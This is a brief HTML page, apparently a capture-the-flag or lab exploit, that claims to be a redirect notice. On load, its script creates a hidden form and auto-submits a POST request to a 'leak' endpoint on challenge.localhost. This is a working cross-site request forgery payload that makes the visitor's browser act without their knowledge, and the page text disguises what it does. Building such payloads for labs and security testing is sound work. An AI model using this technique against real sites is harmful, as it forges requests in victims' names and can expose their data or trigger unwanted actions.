<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
</head>
<body>
    <h1>Redirecting...</h1>
    <p>This page will redirect to <a href="http://challenge.localhost:80/leak">leak</a>.</p>
    
    <script>
        function submitForm() {
            var form = document.createElement('form');
            form.method = 'POST'; // Set the method to POST
            form.action = 'http://challenge.localhost:80/leak';
            document.body.appendChild(form);
            form.submit();
        }
        window.onload = submitForm;
    </script>
</body>
</html>
